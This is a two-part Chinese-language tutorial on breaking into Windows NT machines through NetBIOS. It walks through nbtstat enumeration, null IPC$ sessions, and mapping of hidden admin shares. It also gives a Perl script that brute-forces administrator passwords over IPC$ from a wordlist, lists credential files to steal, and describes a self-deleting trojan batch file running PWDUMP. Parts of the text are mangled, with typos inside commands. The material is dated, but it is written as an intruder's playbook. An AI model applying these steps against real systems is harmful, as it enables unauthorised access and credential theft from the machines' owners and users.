工作站 跳板1 跳板2 跳板3 跳板4 跳板N 目标机
netbios入侵（一）
通过NetBIOS入侵 
所有的入侵都涉及到以root或admin权限登录到某一计算机或网络。入侵的第一步往往是对目标计算机或的端口扫描（portscan）。建立在目标计算机开放端口上的攻击是相当有效的。N T机器的端口信息的显示和UNIX的不同。因此，一般能区分出目标计算机所运行的是哪个操作系统。 
攻击NT为基础的网络时，NetBIOS是首选的进攻点。 
使用端口扫描软件，比如Sam，看看目标计算机的端口139是否打开。139端口是"NetBIOS session"端口，用来进行文件和打印共享的，是NT潜在的危险。注意：运行SAMBA的Linux和UNIX系统的139端口也是打开的，提供类似的文件共享。找到了这样的目标计算机后，接下来是使用" nbtstat"命令。 
NBTSTAT命令是用来询问有关NetBIOS的信息的，也能清除NetBIOS 缓冲区能的内容和将LMHOSTS文件预先装入其中。通过运行这一命令能得到许多有用信息。 
NBTSTAT命令解释：nbtstat [-a RemoteName] [-A IP_address] [-c] [-n] [-R] [-r] [-S] [-s] [interval]开关： -a 列出给定主机名的远程计算机的名字表（name table） -A 列出给定IP地址的远程计算机的名字表 -c 列出远程名字缓冲区（name cache），包括IP地址 -n 列出本地NetBIOS 名字 -r 列出通过广播（broadcast）和WINS解析的名字 
-R 清除和重新装入远程的缓冲的名字表 
-S 列出和目标IP地址会话的表 
-s 列出会话表转换 

NBTSTAT命令的输出的每一栏都有不同的含义，它们的标题有下面几个，含义也在下面做了相应的解释： 

Input 
接收到的字节数。 
Output 
发送的字节数。 
In/Out 这个连接是来自该计算机（outbound）还是来自另外的系统（inbound）。 
Life 
在你的计算机清除名字表之前存在时间。 
Local Name 
连接时本地的名字。 
Remote Host 
远程计算机的名字或IP地址。 
Type 
一个名字可以有两种类型： unique 或group。 
NetBIOS名字的最后16个字符经常代表一些内容。因为同样的名字可以在同一计算机出现几次。 该类型表示名字的最后一个字节（用16进制表示）。 
State 
你的NetBIOS连接将是下面几个状态之一： 
State MeaningAccepting 正在处理一个进入的连接Associated 一个连接的端点已经建立，你的计算机与它以一个IP地址相关Connected 你已经联系到了远程资源。Connecting 你的会话正试图对目标资源进行名字到IP地址的解析Disconnected 你的计算机发出一个断开请求，正在等待远程计算机的响应Disconnecting 正在结束你的连接 
Idle 远程计算机在当前会话已经打开，但目前不接受连接 
Inbound 一个inbound会话正试图连接 
Listening 远程计算机可以使用了 
Outbound 你的会话正在建立一个TCP 连接 
Reconnecting 如果第一次失败，它会在重新连接时显示这一信息下面是一个NBTSTAT命令的实例： 
C:\>nbtstat -A x.x.x.x NetBIOS Remote Machine Name Table 
Name Type Status 
---------------------------------------------------------------------- 
DATARAT < 00> UNIQUE Registered 
R9LABS < 00> GROUP Registered 
DATARAT < 20> UNIQUE Registered 
DATARAT < 03> UNIQUE Registered 
GHOST < 03> UNIQUE Registered 
DATARAT < 01> UNIQUE Registered 
MAC Address = 00-00-00-00-00-00 
上面的输出是什么意思呢？尤其是Type这一栏，代表的是什么呢。再看看下面的表，它能告诉你什么？ 
Name Number Type Usage=====================================================< computername> 00 U Workstation Service< computername> 01 U Messenger Service< \\_MSBROWSE_> 01 G Master Browser< computername> 03 U Messenger Service 
< computername> 06 U RAS Server Service 
< computername> 1F U NetDDE Service 
< computername> 20 U File Server Service 
< computername> 21 U RAS Client Service 
< computername> 22 U Exchange Interchange 
< computername> 23 U Exchange Store 
< computername> 24 U Exchange Directory 
< computername> 30 U Modem Sharing Server Service 
< computername> 31 U Modem Sharing Client Service 
< computername> 43 U SMS Client Remote Control 
< computername> 44 U SMS Admin Remote Control Tool 
< computername> 45 U SMS Client Remote Chat 
< computername> 46 U SMS Client Remote Transfer 
< computername> 4C U DEC Pathworks TCPIP Service 
< computername> 52 U DEC Pathworks TCPIP Service 
< computername> 87 U Exchange MTA 
< computername> 6A U Exchange IMC 
< computername> BE U Network Monitor Agent 
< computername> BF U Network Monitor Apps 
< username> 03 U Messenger Service 
< domain> 00 G Domain Name 
< domain> 1B U Domain Master Browser 
< domain> 1C G Domain Controllers 
< domain> 1D U Master Browser 
< domain> 1E G Browser Service Elections 
< INet~Services> 1C G Internet Information Server 
< IS~Computer_name> 00 U Internet Information Server 
< computername> [2B] U Lotus Notes Server 
IRISMULTICAST [2F] G Lotus Notes 
IRISNAMESERVER [33] G Lotus Notes 
Forte_$ND800ZA [20] U DCA Irmalan Gateway Service 
Unique (U): 名字（name ）可能只分配了一个IP地址。在一个网络设备上，多次出现一个名字已经被注册，但后缀是唯一的，从而整个条目就是唯一的。 
Group (G): 普通的组（group），同一个名字可能存在多个IP地址。Multihomed (M): 名字（name）是唯一的，但由于在同一计算机上有多个网络接口，这个配置在允许注册时是必须的。地址的数目最多25个。Internet Group (I): 这是组名字的一个特殊配置，用于WinNT的域名的管理。Domain Name (D): NT 4.0里新增的。 
这个表是对NBTSTAT输出中Type的解释。通过详细分析NBTSTAT命令的输出，就能收集到目标计算机的许多信息。通过分析，就能发现目标计算机正在运行什么服务，甚至可以分析安装的软件包是什么。从而就能找到空隙可以利用。下一步就是从远程计算机收集可能的用户名。一个网络登录分成两个部分：用户名和口令。一旦一个入侵者知道了用户名，他就等于成功了一半。 
通过分析NBTSTAT的命令输出，入侵者就能得到任何登录到那台计算机上的用户名。在NBTSTAT输出里，类型(Type)为< 03>的就是用户名或计算机名。类型(Type)为< 20>的就表示它是一个共享的资源。 
IPC$(Inter-Process Communication)共享是NT计算机上的一个标准的隐含共享，它是用于服务器之间的通信的。NT计算机通过使用这个共享来和其他的计算机连接得到不同类型的信息的。入侵者常常利用这一点来，通过使用空的I PC会话进行攻击。 
有一个一个比较好的IPC会话工具：RedButton。 它是个很灵巧的程序，能登录到NT系统而不会显示用户名和口令。这个工具运行环境是NT。运行这个程序，将看到任何可能的共享，包括任何隐藏的a dmin共享(ie, shares以"$"结束。默认的，有几个这样的可以得到的共享...C$，WINNT$，IPC$等等)。 
注意：IPC$共享不是一个目录，磁盘或打印机意义上的共享。你看到的"$"，它是默认的在系统启动时的admin共享。IPC是指"interproce ss communications"。IPC$共享提供了登录到系统的能力。注意，你试图通过IPC$连接会在EventLog中留下记录。不管你是否登录成功。 
入侵者使用下面的命令对IPC$实施攻击： 
c:\>net use \\[目标机器的IP地址]\ipc$ /user:< name> < passwd> 
当这个连接建立后，要将username和password送去加以确认。如果你以"Administrator"登录，则需要进行口令猜测。 
可以重复使用'net'命令，进行username和password猜测： 
c:\>net use \\xxx.xxx.xxx.xxx\ipc$ /user:< name> < passwd> 
也可以使用脚本语句： 
open(IPC, "net use \\xxx.xxx.xxx.xxx\ipc$ /user:< name> < passwd> | "); 
NAT工具能自动完成上述功能。NAT是通过读取字典文件中的口令，进行重复登录，从而获取帐号。当然，可以编写一个脚本来实现NAT的功能。 
Perl是一种很好的语言，是解释性的，如Java，但运行速度比Java快。同时，Unix系统能解释它。现在，95和NT版的Perl也已经推出。 
下面这个脚本程序可以用来进行帐号和口令猜测。 
----- begin script ----- 
# ipcchk.plx 
# 该脚本从一个文本文件读入单词，并将该单词作为用户名和口令，进行 
# IPC$连接。成功的连接保存到一个log文件。该脚本不检查输入参数的 
# 有效性，因此必须输入目标机器的合法的IP地址。 
# 
# 用法: c:\>perl ipcchk.plx [目标机器的IP地址] 
open(TEST, "names.txt") | | die "Could not open file."; 
open(LOG,">>ipc.log") | | die "Could not open log."; 
if (length($ARGV[0]) == 0) { 
print "Usage: perl ipcchk.plx [ipaddr]"; 
exit(0); 
} 

$server = ARGV[0]; 
while(< TEST> ) { 
$name = $_; 
chop($name); 
# print "net use \\\\$server\\ipc\$ /userdministrator $name | \n"; 
open(IPC, "net use \\\\$server\\ipc\$ /userdministrator $name | "); 
while(< IPC> ) { 
if (grep(/successfully/,$_)) { 
print LOG "$server accepts connections for password $name\n"; 
# delete a successful connection to avoid multiple connections to 
# the same machine 
open(DEL, "net use \\\\$server\\ipc\$ /d | "); 
} 
} 
----- end script ----- 
当然，你只要知道原理，可以用C语言或BASIC语言，编写一个具有上述功能的程序。 
一旦进入，就不仅仅是能够收集用户名了。还能做许多其他事情。 
接下来，入侵者会试图看看目标计算机上有那些共享的资源可以利用。可以使用下面一个命令： 
c:\>net view \\[目标计算机的IP地址] 
根据目标计算机的安全策略，这个命令有可能被拒绝。看看下面的例子： 
C:\>net view \\0.0.0.0System error 5 has occurred.Access is denied. 
C:\>net use \\0.0.0.0\ipc$ "" /user:""The command completed successfully.C:\>net view \\0.0.0.0 
Shared resources at \\0.0.0.0 
Share name Type Used as Comment 
------------------------------------------------------------------------------- 
Accelerator Disk Agent Accelerator share for Seagate backup 
Inetpub Disk 
mirc Disk 
NETLOGON Disk Logon server share 
www_pages Disk 
该命令顺利地完成了。 
从上面的例子可见，直到空IPC会话成功建立后，服务器的共享资源列表才能访问到。在此时，你可能会想到，这样的IPC连接会有多危险呢，但目前为止我们的有关I PC的知识还是很基本的。我们仅仅开始研究IPC共享的可能性。 
如果有其它共享资源，可以用net命令进行连接。 
c:\>net use x: \\[ipaddr]\[share] 
如果不行，用上述进行的攻击方法。 
一旦IPC$共享顺利完成，下一个命令是： 
c:\>net use g: \\xxx.xxx.xxx.xxx\c$ 
得到了C$共享，并将该目录映射到g:，键入： 
c:\>dir g: /p 
就能显示这个目录的所有内容。 
成功地进行了IPC$连接后，点击Start -> Run，键入regedit。选择Registry -> Connect Network Registry，再键入那台机器的IP地址。不一会，就能看目标计算机的的Registry了。

netbios入侵（二）
网络入侵者通常采取的第一步是通过端口扫描程序扫描目标机或网络。令人吃惊的是，以目标机的开放端口为基础对网络进行的攻击是多么的有条不紊。您应该清楚，除了Unix机外，这是NT机显示不同开放端口的标准。网络入侵者懂得查看端口扫描程序，并通过相当准确的结果来断定它是一台NT机还是一台Unix机。当然也有一些例外，但一般情况下都能这样做。最近，业界发布了几个用来远程鉴别机器的工具，但该功能目前还不能用于NT。 
当攻击基于NT的网络时，NetBIOS往往是首选的攻击对象。因此，NetBIOS就成为本文中第一个要探讨的重要课题。用NetBIOS进行信息收集相当容易，虽然要花费一点时间。etBIOS一般被看作是开销，很大的大容量协议，速度往往很慢，这也就是要耗费时间的原因。如果端口扫描程序报告端口139在目标机上是开放的，那么接下来就是一个很自然的过程。第一步是发出NBTSTAT命令。 
NBTSTAT命令可以用来查询涉及到NetBIOS信息的网络机器。另外，它还可以用来 
消除NetBIOS高速缓存器和预加载LMHOSTS文件。这个命令在进行安全检查时非常有用。 
用法：nbtstat [-a RemoteName] [-A IP_address] [-c] [-n] [-R] [-r] [-S] 
[-s] 
[interval] 
参数-a列出为其主机名提供的远程计算机名字表。 
-A列出为其IP地址提供的远程计算机名字表。 
-c列出包括了IP地址的远程名字高速缓存器。 
-n列出本地NetBIOS名字。 
-r列出通过广播和WINS解析的名字。 
-R消除和重新加载远程高速缓存器名字表。 
-S列出有目的地IP地址的会话表。 
-s列出会话表对话。 
NBTSTAT生成的列标题具有以下含义： 
Input 
接收到的字节数。 
Output 
发出的字节数。 
In/Out 
无论是从计算机（出站）还是从另一个系统连接到本地计算机（入站）。 
Life 
在计算机消除名字表高速缓存表目前“度过”的时间。 
Local Name 
为连接提供的本地NetBIOS名字。 
Remote Host 
远程主机的名字或IP地址。 
Type 
一个名字可以具备两个类型之一：unique or group 
在16个字符的NetBIOS名中，最后一个字节往往有具体含义，因为同一个名可以在同一台计算机上出现多次。这表明该名字的最后一个字节被转换成了16进制。 
State 
NetBIOS连接将在下列“状态”（任何一个）中显示： 
状态含义： 
Accepting: 进入连接正在进行中。 
Associated: 连接的端点已经建立，计算机已经与IP地址联系起来。 
Connected: 这是一个好的状态！它表明您被连接到远程资源上。 
Connecting: 您的会话试着解析目的地资源的名字-IP地址映射。 
Disconnected: 您的计算机请求断开，并等待远程计算机作出这样的反应。 
Disconnecting: 您的连接正在结束。 
Idle: 远程计算机在当前会话中已经打开，但现在没有接受连接。 
Inbound: 入站会话试着连接。 
Listening: 远程计算机可用。 
Outbound: 您的会话正在建立TCP连接。 
Reconnecting: 如果第一次连接失败，就会显示这个状态，表示试着重新连接 

下面是一台机器的NBTSTAT反应样本： 
C:\>nbtstat CA x.x.x.x 
NetBIOS Remote Machine Name Table 
Name Type Status 
--------------------------------------------- 
DATARAT <00> UNIQUE Registered 
R9LABS <00> GROUP Registered 
DATARAT <20> UNIQUE Registered 
DATARAT <03> UNIQUE Registered 
GHOST <03> UNIFQUE Registered 
DATARAT <01> UNIQUE Registered 
MAC Address = 00-00-00-00-00-00 
您通过下表能掌握有关该机器的哪些知识呢？ 
名称编号类型的使用： 
00 U 工作站服务 
01 U 邮件服务 
\\_MSBROWSE_ 01 G 主浏览器 
03 U 邮件服务 
06 U RAS服务器服务 
1F U NetDDE服务 
20 U 文件服务器服务 
21 U RAS客户机服务 
22 U Exchange Interchange 
23 U Exchange Store 
24 U Exchange Directory 
30 U 调制解调器共享服务器服务 
31 U 调制解调器共享客户机服务 
43 U SMS客户机远程控制 
44 U SMS管理远程控制工具 
45 U SMS客户机远程聊天 
46 U SMS客户机远程传输 
4C U DEC Pathworks TCP/IP服务 
52 U DEC Pathworks TCP/IP服务 
87 U Exchange MTA 
6A U Exchange IMC 
BE U网络监控代理 
BF U网络监控应用 
03 U邮件服务 
00 G域名 
1B U域主浏览器 
1C G域控制器 
1D U主浏览器 
1E G浏览器服务选择 
1C G Internet信息服务器 
00 U Internet信息服务器 
[2B] U Lotus Notes服务器 
IRISMULTICAST [2F] G Lotus Notes 
IRISNAMESERVER [33] G Lotus Notes 
Forte_$ND800ZA [20] U DCA Irmalan网关服务 
Unique (U): 该名字可能只有一个分配给它的IP地址。在网络设备上，一个要注册的名字 
可以出现多次，但其后缀是唯一的，从而使整个名字是唯一的。 
Group (G): 一个正常的群；一个名字可以有很多个IP地址。 
Multihomed (M): 该名字是唯一的，但由于在同一台计算机上有多个网络接口， 
这个配置可允许注册。这些地址的最大编号是25。 
Internet Group (I): 这是用来管理WinNT域名的组名字的特殊配置。 
Domain Name (D): NT 4.0提供的新内容。 
网络入侵者可以通过上表和从nbtstat获得的输出信息开始收集有关您的机器的信息。 
有了这些信息，网络入侵者就能在一定程度上断定有哪些服务正在目标机上运行，有时也 
能断定已经安装了哪些软件包。从传统上讲，每个服务或主要的软件包都具有一定的脆弱性，因此，这一类型的 信息 对网络入侵者当然有用。 

＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝第二个逻辑步骤是通过远程机收集可能的用户名。网络登录包括两个部分：用户名和口令。一旦网络入侵者掌握了有效的用户列表，他就能获得一半的有效登录信息。现在，采用了nbtstat命令，网络入侵者就能掌握从本地注册到该台机器上的任何人的登 录名。 在通过nbtstat命令得到的结果中，采用<03>识别符的表目是用户名或机器名。另 外，还 可以通过空IPC会话和SID工具来收集用户名（详细内容见“SID工具”，附录B） 。 IPC$（进程间通信）共享是NT主机上一个标准的隐藏共享，主要用于服务器到服 务器 的通信。NT主机用来互相连接并通过这个共享来获得各种必要的信息。鉴于在各 种操作系 统中都有很多设计特征，网络入侵者已经懂得利用这种特征来达到他们的目的。 通过连接 这个共享，网络入侵者从技术上就能够实现与您的服务器的有效连接。通过与这 个共享的空连，网络入侵者就能够在不需要提供任何身份证明的情况下建立这一连接。 
要与IPC$共享进行空连接，网络入侵者就在命令提示符下发出如下命令： 
c:\>net use \\[目标主机的IP地址]\ipc$ "" /user:"" 
如果连接成功，网络入侵者就会有很多事情可做，不只是收集用户列表，不过他是以收集用户列表开始的。如上所述，这个方法需要一个空IPC会话和SID工具。由Evgenii Rudnyi编写的SID工具包括两个不同的部分：User2sid和Sid2user。User2sid采 用一个帐户名字或群组，给您一个对应的SID。而Sid2user采用一个SID，给您对 应的用户或群组的名字。作为一个独立的工具，这个进程是手工进行的，要消耗大量的时间。 Userlist.pl是monix编写的一个perl脚本，它将使这个SID进程自动化，从而 大大 缩短网络入侵者收集这些消息所花费的时间。 
这时，网络入侵者就会了解到哪些服务正在远程机上运行以及已经安装了哪些主要的软件包（有限的），同时还能得到该机器上有效的用户名和群组列表。尽管这似乎是一个外来者所要掌握的有关您的网络的信息，但是，空IPC会话已经为信息收集留下了其它隐患。目前，Rhino9小组已经能够检索远程机的全部固有安全约束规则。帐户封锁 、最小口 令长度、口令使用周期、口令唯一性设置以及每一个用户、他们所归属的群组以 及该用户的个人域限制等所有信息都可以通过一个IPC空会话获得。这个信息收集功能将在近期发布的eviathan工具（由Rhino9小组编写）中提供。下面将对目前可用的一些工具进行探讨，这些工具可用来通过空IPC会话收集更多的信息. 

有了这个空IPC会话，网络入侵者也能获得网络共享列表，否则就无法得到。为此，网络入侵者希望了解到在您的机器上有哪些可用的网络共享。为了收集到这些信息，要采用下列这个标准的net view命令： 
c:\>net view \\[远程主机的IP地址] 
根据目标机的安全约束规则，可以拒绝或不拒绝这个列表。举例如下： 
C:\>net view \\0.0.0.0 
System error 5 has occurred. 
Access is denied. 
C:\>net use \\0.0.0.0\ipc$ "" /user:"" 
The command completed successfully. 
C:\>net view \\0.0.0.0 
Shared resources at \\0.0.0.0 
Share name Type Used as Comment 
---------------------------------------------------------------------- 
--------- 
Accelerator Disk Agent Accelerator share for Seagate backup 
Inetpub Disk 
mirc Disk 
NETLOGON Disk Logon server share 
www_pages Disk 
The command completed successfully. 
正如您所看到的，该服务器上的共享列表在建立了空IPC会话后才可用。这时，您就会意识到这个IPC连接有多么的危险，但我们现在已经掌握的IPC方法实际上是很基本的方法。与IPC共享一起出现的可能性还有待进一步研究。WindowsNT 4.0资源工具的发布使得象管理员和网络入侵者这样的人能够用到新的工具。下面对一些资源工具实用程序进行描述。Rhino9小组运用这些实用程序与IPC$空会话 一起收集信息。当您阅读这些工具的描述以及它们所提供的信息时，请记住：所 采用的空 会话不向远程网络提供任何真实的身份证明。 
UsrStat: 这个命令行实用程序显示特定域中各个用户的用户名、全名以及最后一次登录的日期和时间。下面是根据远程网络通过一个空IPC会话采用这个工具进行的实际剪切和粘贴： 
C:\NTRESKIT>usrstat domain4 
Users at \\STUDENT4 
Administrator - - logon: Tue Nov 17 0855 1998 
Guest - - logon: Mon Nov 16 124:04 1998 
IUSR_STUDENT4 - Internet Guest Account - logon: Mon Nov 16 1596 1998 
IWAM_STUDENT4 - Web Application Manager account - logon: Never 
laurel - - logon: Never 
megan - - logon: Never 

我们现在来探讨一下整个俘获过程是怎么样发生的，以便于加深读者的理解。在真正的攻击发生前，把一个映射放到通过#PRE/#DOM标记映射Student4机器及其域活动状态的mhosts文件中（下面详述）。然后把表目预加载到NetBIOS高速缓存器中，同时建立一个空IPC会话。正如您所看到的，这个命令是根据域名发出的。最后，该工具会向主域控制器查询这个。 
其它涉及到IPC共享的渗透方法包括打开远程机的注册表以及远程域用户管理器。空IPC连接使网络入侵者能够对您的注册表进行访问。一旦建立了空IPC会话，网络入侵者就能启用其本地注册表编辑器实用程序，并尝试连接网络注册表选项。如果尝试成 功，入侵者就会对一定的注册表键具有只读访问权限，甚至是读/写权限。无论如何，就算对注册表只有只读访问权限，从安全角度来讲这也是非常有害的。 
另外，网络入侵者还会利用IPC域用户管理器方法。这个方法鲜为人知。我们在这里涉及到这个问题是因为它是一个非常有效的入侵方法。这个方法涉及到一个空IP C会话和输入LMHOSTS文件的表目。LMHOSTS文件（在一般情况下）是一个保存在基于Wind ows的机器上的本地文件，用于把NetBIOS名字映射到IP地址。LMHOSTS文件主要用在非WI NS环境中或者不能使用WINS的客户机上，而实际上，网络入侵者可以通过很多种不同的方式来使用这个文件。我们将在下文中对LMHOSTS文件的不同使用方法进行探讨. 

===========================================================================现在我们对如何在这个方法中使用LMHOSTS文件进行论述。这是一个绝妙的方法，因为它能说明如何把前面介绍的方法与这个方法结合起来使用从而达到网络入侵者的目的。我们先从端口扫描程序开始，假设端口139是开放的，攻击者就会发出一个nbtstat命令。然后，他会通过nbtstat结果收集远程机的NetBIOS名字。 
让我们来看看得出的nbtstat结果，与前面的结果相同： 
C:\>nbtstat -A x.x.x.x 
NetBIOS Remote Machine Name Table 
Name Type Status 
--------------------------------------------- 
DATARAT <00> UNIQUE Registered 
R9LABS <00> GROUP Registered 
DATARAT <20> UNIQUE Registered 
DATARAT <03> UNIQUE Registered 
GHOST <03> UNIQUE Registered 
DATARAT <01> UNIQUE Registered 
MAC Address = 00-00-00-00-00-00 
通过检查nbtstat命令的结果，我们可以找到<03>识别符。如果有人从本地登录到 该 机器上，您就会看到两个<03>识别符。在一般情况下，第一个<03>识别符是机器的netbios名字，第二个<03>识别符是本地登录用户的名字。这时，网络入侵者就会把这台机器的netbios名字和IP地址映射放到他本地的LMHOSTS文件中，用#PRE和#DOM标 签终止表目。#PRE标签表示应该把表目预加载到netbios高速缓存器中。#DOM标签表示域活动。这 时，网络入侵者就会发出一个nbtstat CR命令，把表目预加载到他的高速缓存器 中。从技术角度来讲，这个预加载会使表目看起来好象已经由一些网络功能解析过，并使名字解析起来更加快捷。 
下一步，网络入侵者会建立一个空IPC会话。一旦成功地建立了空IPC会话，网络入侵者就能启用域用户管理器的本地拷贝，并在用户管理器中利用选择域功能。接着，远程机的域就会出现（或者能够人工输入），因为它已经被预加载到高速缓存器中。如果远程机的安全性没有保障，用户管理器就会显示远程机上所有用户的列表。如果这是通过一个很缓慢的链接（如28.8K调制解调器）来进行的，那么在一般情况下就不会起作用。但如果 采用较快的网络连接，就会有成效。既然网络入侵者已经收集到有关您的机器的资料，下一步就是真正渗透您的机器 。我 们要探讨的第一个渗透方法是公开文件共享攻击。网络入侵者会把前面提到的net view命 令和net use命令结合起来实现这一攻击。 
我们采用前面的net view命令对网络入侵者的攻击进行论述： 
C:\> net view \\0.0.0.0 
Share name Type Used as Comment 
---------------------------------------------------------------------- 
--------- 
Accelerator Disk Agent Accelerator share for Seagate backup 
Inetpub Disk 
mirc Disk 
NETLOGON Disk Logon server share 
www_pages Disk 
The command completed successfully. 
一旦攻击者掌握了远程共享列表，他就会试着映射到远程共享。这一攻击的命令结构是： 
c:\>net use x: \\0.0.0.0\inetpub 
只有当共享不设密码或分配给everyone群组时这一攻击才有效（注：everyone群组表示每个人。如果有人作为空用户连接，他们现在就是everyone群组的组成部分）。如果这些参数都正确，攻击者就能把网络驱动器映射到您的机器上并开始一系列的渗透攻击。请记住：网络入侵者并不局限于把驱动器映射到通过net view命令显示出来的共享上。了解NT的网络入侵者都知道NT隐藏了管理共享。根据默认值，NT为该机器上的每一个驱动器都创建IPC$共享和一个隐藏共享（即：一台有C、D和E驱动器的机器会有对应的C$、D$和E$ 的隐藏共享）。另外，还有一个直接映射到NT安装路径的隐藏ADMIN$共享（即：如果您把 NT安装在:\winnt目录下，ADMIN$就映射到该驱动器的确切位置）。Rhino9小组已经注意到，大多数NT安全界人士似乎都不大重视这个从一台内部NT机渗透另一台内部NT机的概念。在我们的专业检查过程中，Rhino9小组已经多次完成了这项任务。问题是，如果网络入侵者是有心的并能得到对您的一台机器的访问权限，他就会悄悄地潜入其余的网络机器。因此，这些共享攻击会造成严重的威胁。 （旁注：Rhino9小组曾经对位于佛罗里达州的一家大型ISP进行远程渗透检查。我们 先得到其技术人员个人机器上的共享访问权限，然后从那里得到整个网络的访问 权限。这是完全可以办到的。） 
首先，有些人可能不会意识到有人在访问您的硬盘时对您的机器所造成的危险。访问硬盘为收集信息和安放特洛伊木马/病毒提供了新的途径。一般情况下，攻击者会寻找包含有口令或高度敏感的数据的内容，因为他能利用这些数据来继续深入您的网络。下面列出的是网络入侵者要寻找和利用的一些文件。我们对每一个文件及其使用方法都进行了简要的介绍。 

Eudora.ini: 这个文件用来存储支持eudora电子邮件软件的配置信息。被称为udpass.com的工具会提取个人用户名、口令信息以及网络入侵者需要用来窃取用户邮件的所有信息。这时，入侵者可以通过配置自己的电子邮件软件来阅读目标邮件。同样，有些人要花很长时间才能意识到这一危险的存在。但是，要记住，在一般情况下，人都会很容易地养成习惯的。用户的电子邮件口令与他们用来登录到网络的口令在大多数情况下都 是相同的。现在攻击者要做的就是不断地窥探用户的硬驱，寻找能为他指出该用户业务场所的用户简历或一些与工作相关的其它文档，从而使他能够对网络发动强大的攻势。 
Tree.dat: 这是一个由通用软件CuteFTP用来存储用户ftp站点/用户名/口令的文件。利用一个称为FireFTP的程序，攻击者就能轻易地破解tree.dat文件。这样，如上所述，他能不断地收集有关您的信息并对您的业务场所发起攻击。显而易见，如果您在tree.dat中有一个直接到您业务场所的ftp映射，那么他就能更容易地攻击您的网络。 
PWL: PWL一般内置在Win95机上。它们用来为Windows95最终用户存储操作特有的口令。一个称为glide.exe的工具会破坏PWL文件。另外还有一些介绍如何用计算器人工破坏这些PWL文件加密的文档。接下来，攻击者会继续收集有关用户的信息并拟订攻击方案。 
PWD: PWD文件在运行FrontPage或Personal Webserver的机器上。这些文件包括纯文本用户名和一个与用来管理Web站点的身份证明资料相匹配的加密口令。用于这些口令的加密方案是标准的DES方案。众所周知，在internet上提供有很多破坏实用程序的DES。 
Solar Designer编写的John the Ripper能非常有效的破坏这些口令。 
WS_FTP.ini: 这个ini文件在使用ws_ftp软件的机器上。尽管适用于这个文件的自动 口令析取字最近才被推荐给安全界，但所采用的加密机制还不够强壮。口令是被转换成十六进制数（2位）的。如果一个数字在N位置，那么N就被增加到该数字上。反向操作就会破坏这个加密方案。（这种方法有时也可破坏PMail.iniCPegasus Mail和Prefs.jsCNetscape。） 
IDC文件：IDC（internet数据库连接符）文件一般用于从web服务器到数据库的后端连接。因为这种类型的连接一般都需要身份认证，所以，一些IDC文件包含有纯文本的用户名/口令。waruser.dat: 这是适用于通用Win32 FTP服务器--WarFTP的配置文件。这个特殊的dat文件可包含FTP服务器本身的管理口令。根据作者掌握的资料，这种情况仅在WarFTP 1.70版中发生。 
$winnt$.inf：在WindowsNT的独立安装过程中，安装进程需要信息文件。作为这个独立安装进程的残余数据，有一个称为$winnt$.inf的文件位于%systemroot%\system32 目录下。这个文件可包含有在安装过程中要使用的帐户的用户名/口令。因为在这些类型的安装中所使用的帐户一般都需要网络上的允许权限设置，所以这是一件很重要的事。 
Sam._：尽管人们很早就知道如果SAM数据库被心怀叵测的人所利用就会出现问题，但很多人都不记得这个sam._文件了。如果入侵者能够通过网络安装驱动器，那该如何拷贝SAM数据库呢？一般情况下这是不大可能的，因为您所连接的NT服务器正在运行。当NT服务器正在运行时，它会锁定SAM。不过，如果管理员已经创建了一个紧急修复盘，SAM的拷贝就应该位于systemroot%\repair\目录下。这个文件将命名为sam._。根据默认值，这个拷贝是人人都可读取的。通过利用samdump实用程序的拷贝，您就能从复制的SAM中转储用户名/口令。ExchVerify.log：这个ExchVerify.log文件是由Cheyenne/Innoculan/ArcServe生成的。一般情况下，它是通过安装Cheyenne/Innoculan/ArcServe软件生成的，内置在进行软件安装的驱动器的根目录下。这个文件可包含有极其敏感的信息，如下所示： 
: ExchAuthenticate() called with 
NTServerName:[SAMPLESERVER] 
NTDomainName[SAMPLESERVER] adminMailbox:[administrator] 
adminLoginName:[administrator] 
password:[PASSWORD] 
很明显，这个文件包含有入侵者用来进一步破坏您的网络完整性的信息。 
Profile.tfm：Profile.tfm是一个由POP3客户机软件AcornMail生成的文件。在撰写本文时，AcornMail开始引起internet界的广泛关注。在检测该软件时，我们发现它是一个很有效的POP3客户机，但其安装并不很好地兼容NTFS。在安装完该软件后，我们开始检查AcornMail生成的文件，发现Profile.tfm文件保存有用户名/口令。一开始，我们断定该软件完全正常，因为它确实以加密的形式存储口令。接着，我们意识到profile.tfm的允许权限被设置为Everyone/完全控制。这样就有了问题，因为任何人都能得到该文件的一个拷贝并把这个文件插入他们自己的AcornMail安装程序中。然后，入侵者就能 
用已存储的信息来登录。下面是网络监测器中的俘获信息： 
00000000 00 01 70 4C 67 80 98 ED A1 00 01 01 08 00 45 00 ..pLg........ 
.E. 
00000010 00 4A EA A7 40 00 3D 06 14 88 CF 62 C0 53 D1 36 .J..@.=....b. 
S.6 
00000020 DD 91 00 6E 04 44 F6 1E 84 D6 00 32 51 EB 50 18 ...n.D.....2Q 
.P. 
00000030 22 38 64 9E 00 00 2B 4F 4B 20 50 61 73 73 77 6F "8d...+OK.Pas 
swo 
00000040 72 64 20 72 65 71 75 69 72 65 64 20 66 6F 72 20 rd.required.f 
or. 
00000050 68 6B 69 72 6B 2E 0D 0A jjohn... 
00000000 98 ED A1 00 01 01 00 01 70 4C 67 80 08 00 45 00 ........pLg.. 
.E. 
00000010 00 36 A4 02 40 00 80 06 18 41 D1 36 DD 91 CF 62 .6..@....A.6. 
..b 
00000020 C0 53 04 44 00 6E 00 32 51 EB F6 1E 84 F8 50 18 .S.D.n.2Q.... 
.P. 
00000030 21 AC 99 90 00 00 50 41 53 53 20 67 68 6F 73 74 !.....PASS.xe 
rox 
00000040 37 33 0D 0A 63.. 

如您所看到的，用户名/口令确实是用纯文本传送的。这不是AcornMail的错，但是在POPvX中已经有问题出现。这个“数据”文件对换/包取样的方法已经由Rhino9小组在大量的软件上测试过，因此，这一攻击并不局限于AcornMail。 
我们已经对入侵者想要得到的文件（如果获得对您的硬驱的访问权限）进行了探讨，现在我们就来讨论一下安放特洛伊木马。如果有一种方法能使攻击者获得大量的 信息，那就是安放特洛伊木马。公开的文件共享攻击一般都会为安放特洛伊木马提供方便。在最容易安放和最广为人知的特洛伊木马中，有一个是捆绑在批处理文件中的PWDUMP实用程序。如果准备妥当，这个批处理文件就会最小化执行（也被称为聪明的文件，如viruscan.cmd），然后再运行PWDUMP实用程序，在运行了它的进程后删除PWDUMP实用程序，并最终删去文件本身。它一般都不会留下证据，并会在该台机器上生成一个完美的所有用户名/口令 
的文本文件。 
